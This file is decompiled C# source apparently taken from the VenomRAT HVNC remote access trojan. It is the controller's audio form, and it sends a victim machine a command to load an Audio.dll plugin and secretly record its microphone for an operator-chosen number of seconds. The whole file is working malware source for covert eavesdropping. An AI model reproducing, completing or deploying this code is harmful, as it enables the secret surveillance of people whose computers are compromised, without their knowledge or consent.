using System;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Algorithm;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x02000079 RID: 121
    public partial class FormAudio : Form
    {
        // Token: 0x170000C7 RID: 199
        // (get) Token: 0x06000461 RID: 1121 RVA: 0x0002B186 File Offset: 0x0002B186
        // (set) Token: 0x06000462 RID: 1122 RVA: 0x0002B18E File Offset: 0x0002B18E
        public Form1 F { get; set; }

        // Token: 0x170000C8 RID: 200
        // (get) Token: 0x06000463 RID: 1123 RVA: 0x0002B197 File Offset: 0x0002B197
        // (set) Token: 0x06000464 RID: 1124 RVA: 0x0002B19F File Offset: 0x0002B19F
        internal Clients ParentClient { get; set; }

        // Token: 0x170000C9 RID: 201
        // (get) Token: 0x06000465 RID: 1125 RVA: 0x0002B1A8 File Offset: 0x0002B1A8
        // (set) Token: 0x06000466 RID: 1126 RVA: 0x0002B1B0 File Offset: 0x0002B1B0
        internal Clients Client { get; set; }

        // Token: 0x06000467 RID: 1127 RVA: 0x0002B1B9 File Offset: 0x0002B1B9
        public FormAudio()
        {
            this.InitializeComponent();
            base.MinimizeBox = false;
            base.MaximizeBox = false;
        }

        // Token: 0x170000CA RID: 202
        // (get) Token: 0x06000468 RID: 1128 RVA: 0x0002B1E0 File Offset: 0x0002B1E0
        // (set) Token: 0x06000469 RID: 1129 RVA: 0x0002B1E8 File Offset: 0x0002B1E8
        public byte[] BytesToPlay { get; set; }

        // Token: 0x0600046A RID: 1130 RVA: 0x0002B1F4 File Offset: 0x0002B1F4
        private void btnStartStopRecord_Click(object sender, EventArgs e)
        {
            if (this.textBox1.Text != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "audio";
                msgPack.ForcePathObject("Second").AsString = this.textBox1.Text;
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Audio.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
                Thread.Sleep(100);
                this.btnStartStopRecord.Text = "Wait...";
                this.btnStartStopRecord.Enabled = false;
                return;
            }
            MessageBox.Show("Input seconds to record.");
        }

        // Token: 0x0600046B RID: 1131 RVA: 0x0002B2E0 File Offset: 0x0002B2E0
        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.Client.TcpClient.Connected || !this.ParentClient.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        // Token: 0x0600046C RID: 1132 RVA: 0x000067A9 File Offset: 0x000067A9
        private void FormAudio_Load(object sender, EventArgs e)
        {
        }

        // Token: 0x0600046D RID: 1133 RVA: 0x000067A9 File Offset: 0x000067A9
        private void bunifuGroupBox1_Enter(object sender, EventArgs e)
        {
        }

        // Token: 0x04000381 RID: 897
        private SoundPlayer SP = new SoundPlayer();
    }
}